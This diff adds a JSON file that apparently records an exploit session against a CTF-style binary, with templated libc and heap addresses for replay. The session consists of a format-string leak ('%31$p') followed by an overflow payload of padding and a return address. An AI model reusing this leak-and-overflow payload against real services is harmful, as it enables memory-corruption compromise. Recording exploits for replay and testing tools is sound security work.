@@ -1,0 +1,7 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welc{{{HEAP_BASE:73071:3:ORI:4:0x656d6f}}}!0x{{{LIBC_BASE:133168:12:HEX:10:0{{{HEAP_BASE:124792:3:ORI:9:0x663778}}}39a90c2830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:8:ORI:72:0x7f39a90e7216}}}ca{{{HEAP_BASE:4449:3:ORI:82:0x646161}}}aaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{{LIBC_BASE:283158:6:ORI:72:0x7f39a90e7216}}}HTTP/1.1 404 Not Fo{{{HEAP_BASE:7797:3:ORI:207:0x646e75}}}\\r\\nCo{{{HEAP_BASE:74862:3:ORI:144:0x65746e}}}nt-T{{{HEAP_BASE:73849:3:ORI:111:0x657079}}}:{{{HEAP_BASE:74784:3:ORI:115:0x657420}}}xt/html; cha{{{HEAP_BASE:74610:3:ORI:130:0x657372}}}t=UTF-8\\r\\nCo{{{HEAP_BASE:74862:3:ORI:144:0x65746e}}}nt{{{HEAP_BASE:64557:3:ORI:149:0x654c2d}}}ngth: 23\\r{{{HEAP_BASE:66314:3:ORI:161:0x65530a}}}{{{HEAP_BASE:75378:3:ORI:176:0x657672}}}r: Eas{{{HEAP_BASE:66425:3:ORI:173:0x655379}}}{{{HEAP_BASE:75378:3:ORI:176:0x657672}}}r (Linux)\\r\\n\\r\\n<h3>P{{{HEAP_BASE:71521:3:ORI:197:0x656761}}} Not Fo{{{HEAP_BASE:7797:3:ORI:207:0x646e75}}}</h3>"
+]
